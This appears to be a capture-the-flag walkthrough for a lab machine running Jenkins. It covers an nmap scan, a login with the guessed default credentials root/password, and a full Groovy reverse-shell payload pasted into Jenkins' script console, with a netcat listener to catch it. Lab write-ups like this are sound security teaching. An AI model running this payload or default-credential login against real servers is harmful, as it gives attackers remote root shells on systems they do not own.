Step1:  
  Run an nmap scan on the target machine to check for listening ports and service versions to get the answer to question 3
  nmap -sV <target_IP>
  We find that port 8080 is running on the http protocol using Jetty 9.4.39.v20210325
  
Step2:
  Navigate over to the webpage hosted on the target machine on port 8080.
  <http://target_IP:8080>
  Right click the webpage and inspect navigate over to the network tab and refresh inside the login page get request header the answer to qeustion for will be displayed

Step3: 
  Since all of the questions up until this point were just general knowledge of the use of tools and enumeration didn't find much all we can really do is try to guess some login credentials at the login page
  the correct login credentials are
  Username: root
  Password: password
  From here we can click on "manage Jenkins" on the lefthand side, from this menu we can select "script console"
  
Step4: 
  We know from the questions that jenkins takes a script named goovy so we need to configure a payload using groovy to execute a reverse shell
  A cheat sheet for that can be found here
  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
  Spefically this 
 
 String host="{your_IP}";
  int port=*listener port you set;
  String cmd="/bin/bash";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
  Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),
  si=s.getInputStream();OutputStream
  po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
  {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
  {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  
  You need to configure the first 2 line to match your attack machines IP address and the listener port port we will set up to catch the reverse shell.
  nc -lvnp <port>
  
  Edit the script to match your IP and the listener port  you set up on netcat, run the script on jenkins and the shell should pop up on the terminal netcat is looking on
  run whoami to see that we are logged in as root
  run ls to see what files are in the current directory
  run cd to move to the root directory
  ls again to check the files
  cat flag.txt to reveal the flag
